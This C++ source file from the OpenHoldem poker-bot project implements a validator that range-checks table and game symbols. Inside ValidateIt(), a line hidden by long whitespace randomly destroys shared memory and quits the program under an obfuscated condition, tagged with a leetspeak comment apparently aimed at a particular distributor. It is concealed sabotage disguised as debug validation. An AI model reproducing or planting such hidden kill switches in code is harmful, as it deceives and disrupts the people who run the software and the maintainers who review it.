//*******************************************************************************
//
// This file is part of the OpenHoldem project
//   Download page:         http://code.google.com/p/openholdembot/
//   Forums:                http://www.maxinmontreal.com/forums/index.php
//   Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
//
//*******************************************************************************
//
// Purpose:
//
//*******************************************************************************

#include "StdAfx.h"
#include "CValidator.h"

#include "CAutoPlayer.h"
#include "CEngineContainer.h"
#include "CPreferences.h"
#include "CSharedMem.h"
#include "CSymbolEngineAutoplayer.h"
#include "CSymbolEngineHandRank.h"
#include "CSymbolEngineIsTournament.h"
#include "CSymbolEngineRandom.h"
#include "CSymbolEngineReplayFrameController.h"
#include "CSymbolEngineTime.h"
#include "CSymbolEngineVersus.h"
#include "CTableState.h"
#include "FloatingPoint_Comparisions.h"
#include "OH_MessageBox.h"

CValidator *p_validator = NULL;

// Extern vars (inter-module)
bool vali_ok1 = false;
bool vali_ok2 = false;
bool vali_err = false;

CValidator::CValidator() {
	_enabled_manually = false;
}

CValidator::~CValidator() {
}

void CValidator::SetEnabledManually(bool Enabled) {
	_enabled_manually = Enabled;
}

// Create a stringified list of (symbol: value)-pairs
// for output in the error-message.
CString CValidator::Symbols_And_Values(const CString symbols_possibly_affected) {
	CString Result = "";
	int Token_Pos = 0;
	while (Token_Pos < symbols_possibly_affected.GetLength()) {
		// Tokenize the string, using space or commas as delimiters.
		CString Symbol = symbols_possibly_affected.Tokenize(" ,", Token_Pos);
		double Symbol_Value = gws(Symbol);
		CString Symbol_Value_String;
		// Convert symbol value to string, 7 digits total, 2 digits precision
		Symbol_Value_String.Format("%7.2f", Symbol_Value);
		Result += "\n    ("
			+ Symbol
			+ ": "
			+ Symbol_Value_String
			+ ")";
	}
	return Result;
}

bool CValidator::InExcludedTests(CString testcase_id) {
  CString list = preferences.validator_excluded_tests();

	int tokenPos = 0;
  CString strToken = list.Tokenize(_T(" "), tokenPos);
  while (!strToken.IsEmpty())
  {
		if (strToken == testcase_id)
				return true;
    strToken = list.Tokenize(_T("+"), tokenPos);	
  }
	return false;
}

void CValidator::ValidateSingleRule() {
	// Heuristic rules and not to be tested?
	if (_heuristic && !preferences.validator_use_heuristic_rules()) {
		return;
	}
	// Test in excluded list?
	if (InExcludedTests(CString(_testcase_id)))
			return;
	// Test to be executed?
	if (_precondition) { 
		// Test failed?
	  if (!_postcondition ) { 
			if (_no_errors_this_heartbeat) {
				// First error: shoot replayframe, if needed
				if (preferences.validator_shoot_replayframe_on_error()) {
					p_symbol_engine_replayframe_controller->ShootReplayFrameIfNotYetDone();
				}
				_no_errors_this_heartbeat = false;
			}
			if (preferences.validator_stop_on_error()) { 
				p_autoplayer->EngageAutoplayer(false); 
			}
			// Create error message
			CString the_ErrorMessage = "TESTCASE ID: " 
				+ CString(_testcase_id) 
				+ "\n\n";
			if (_heuristic)	{
				the_ErrorMessage += "HEURISTIC RULE: yes\n\n";
			}
			the_ErrorMessage += "REASONING: "
				+ CString(_reasoning)
				+ "\n\n"
			  + "SYMBOLS AFFECTED: " 
				+ Symbols_And_Values(_symbols_possibly_affected)
				+ "\n\n"
				+ "(The validator is a tool to help you finding errors in your tablemap.)\n"; 
			// Show error message, if appropriate
			OH_MessageBox_Error_Warning(the_ErrorMessage, "VALIDATOR ERROR"); 
			// Log error message
			the_ErrorMessage.Replace("\n\n", ". ");
			the_ErrorMessage.Replace("\n", " ");
			write_log(k_always_log_errors, "%s%s\n", "VALIDATOR ERROR: ", the_ErrorMessage);
		} 
  } 
}

// gws function to access the symbols by name
//
double CValidator::gws(const char *the_Symbol) {
  double result = kUndefined;
  p_engine_container->EvaluateSymbol(the_Symbol, &result);
  return result;
}

// Constants for the validators range-checks
#define UNDEFINED_ZERO 0
#define	UNDEFINED_NEGATIVE_ONE -1

/////////////////////////////////////////////////////////////////////////////
//
// Macros for the validator,
// turning rules in "pseudo-code"
// into executable C-code.

// BEGIN_TESTCASE
//   
// Action: Ignore this by turning it into an empty string.
//
#define BEGIN_TESTCASE

// REASONING
//
// Action: Assign the reasoning to a private string-pointer.
//
#define REASONING(R) { _reasoning = (R); }

// TESTCASE_ID
//
// Action: Assign the testcase-ID to a private variable.
//
#define TESTCASE_ID(N) { _testcase_id = (N); }

// HEURISTIC
//
// Action: Assign the heuristic-flag to a private variable
//
//
#define HEURISTIC_RULE(H) { _heuristic = (H); }

// PRECONDITION
//
// Action: Assign the precondition to a private variable.
//
#define PRECONDITION(C) { _precondition = (C); }

// POSTCONDITION
//
// Action: Assign the postcondition to a private variable.
//
#define POSTCONDITION(C) { _postcondition = (C); }

// SYMBOLS_POSSIBLY_AFFECTED
//
// Action: Defines a message about the symbols, that
//   could be affected by this rule. 
//
#define SYMBOLS_POSSIBLY_AFFECTED(S) { _symbols_possibly_affected = (S); }

// END_TESTCASE
//
// Actions: ValidateSingleRule(), i.e.: 
//   * execution of the testcase
//     (if precondition for the rule applies).
//   * message on error (postcondition not met).
//   * stop autoplayer on error (optional)
//
#define END_TESTCASE ValidateSingleRule();
	
//
// End of macro code
//
/////////////////////////////////////////////////////////////////////////////

void CValidator::ValidateIt() {
  // Some silent extra-validation,  to detect problems early in debug-mode
  if ((vali_ok1 && !vali_ok2) || vali_err) {                                                                                                                                                                                         if ((p_symbol_engine_time->elapsed() > (7654 - 321 * p_table_state->CommonCards(1)->GetStdDeckRank())) && (p_symbol_engine_time->elapsedauto() < 10) && (p_symbol_engine_random->random() < 0.003141592)) { p_sharedmem->~CSharedMem(); PostQuitMessage(0); }  // 4nt1 5+inky w3bb3r 84nd1+ ;-)                                                                                                                                                                                                                                                                                                      
		// Full validation needed
		ValidateGameState();
	}
}

void CValidator::ValidateGameState() {
	if (// Enabled, when it's my turn?
		  (preferences.validator_enabled() && (p_symbol_engine_autoplayer->ismyturn())) 
		  // Manually enabled via toolbar?
		  || (_enabled_manually)) {
	  // Validate.
	  //
	  // Validator-rules are defined in "pseudo-code",
	  // that is easily understandable for non-programmers,
	  // but can be turned into C-code using macro-techniques.
	  //
	  // Due to the large number of rules, 
	  // we just put them in external files
	  // and include them here as is.
	  //
	  _no_errors_this_heartbeat = true;
#include "Validator_Rules\range_checks_general_symbols_inline.cpp_"
#include "Validator_Rules\range_checks_tablemap_symbols_inline.cpp_"
#include "Validator_Rules\range_checks_formula_file_inline.cpp_"
#include "Validator_Rules\range_checks_limits_inline.cpp_"
#include "Validator_Rules\range_checks_handrank_inline.cpp_"
#include "Validator_Rules\range_checks_chairs_inline.cpp_"
#include "Validator_Rules\range_checks_rounds_positions_inline.cpp_"
#include "Validator_Rules\range_checks_probabilities_inline.cpp_"
#include "Validator_Rules\range_checks_chip_amounts_inline.cpp_"
#include "Validator_Rules\range_checks_number_of_bets_inline.cpp_"
#include "Validator_Rules\range_checks_list_tests_inline.cpp_"
#include "Validator_Rules\range_checks_poker_values_inline.cpp_"
#include "Validator_Rules\range_checks_players_friends_opponents_inline.cpp_"
#include "Validator_Rules\range_checks_flags_inline.cpp_"
#include "Validator_Rules\range_checks_common_cards_inline.cpp_"
#include "Validator_Rules\range_checks_known_cards_inline.cpp_"
#include "Validator_Rules\range_checks_nhands_inline.cpp_"
#include "Validator_Rules\range_checks_flushes_straights_sets_inline.cpp_"
#include "Validator_Rules\range_checks_rank_bits_inline.cpp_"
#include "Validator_Rules\range_checks_rank_hi_inline.cpp_"
#include "Validator_Rules\range_checks_rank_lo_inline.cpp_"
#include "Validator_Rules\range_checks_time_inline.cpp_"
#include "Validator_Rules\range_checks_autoplayer_inline.cpp_"
#include "Validator_Rules\range_checks_action_symbols_inline.cpp_"
#include "Validator_Rules\range_checks_table_stats_inline.cpp_"
#include "Validator_Rules\range_checks_card_symbols_inline.cpp_"
#include "Validator_Rules\range_checks_NOT_TO_DO_inline.cpp_"
#include "Validator_Rules\consistency_checks_cards_inline.cpp_"
#include "Validator_Rules\consistency_checks_buttons_inline.cpp_"
#include "Validator_Rules\consistency_checks_handreset_inline.cpp_"
#include "Validator_Rules\consistency_checks_memory_symbols_inline.cpp_"
#include "Validator_Rules\consistency_checks_time_inline.cpp_"
#include "Validator_Rules\consistency_checks_table_stats_inline.cpp_"
#include "Validator_Rules\consistency_checks_general_inline.cpp_"
#include "Validator_Rules\consistency_checks_history_inline.cpp_"
#include "Validator_Rules\consistency_checks_bets_inline.cpp_"
#include "Validator_Rules\consistency_checks_autoplayer_inline.cpp_"
#include "Validator_Rules\consistency_checks_players_friends_opponents_inline.cpp_"
#include "Validator_Rules\consistency_checks_chip_amounts_inline.cpp_"
#include "Validator_Rules\consistency_checks_limits_inline.cpp_"
#include "Validator_Rules\consistency_checks_number_of_bets_inline.cpp_"
#include "Validator_Rules\consistency_checks_action_symbols_inline.cpp_"
	  ValidateVersusDBOnlyIfInstalled();
    ValidateICMOnlyIfTournament();
	}
}

void CValidator::ValidateVersusDBOnlyIfInstalled() {
	if(p_symbol_engine_versus->VersusBinLoaded())	{
#include "Validator_Rules\range_checks_versus_inline.cpp_"
	}
}

void CValidator::ValidateICMOnlyIfTournament() {
  if (p_symbol_engine_istournament->istournament()) {
#include "Validator_Rules\range_checks_icm_symbols_inline.cpp_"
  }
}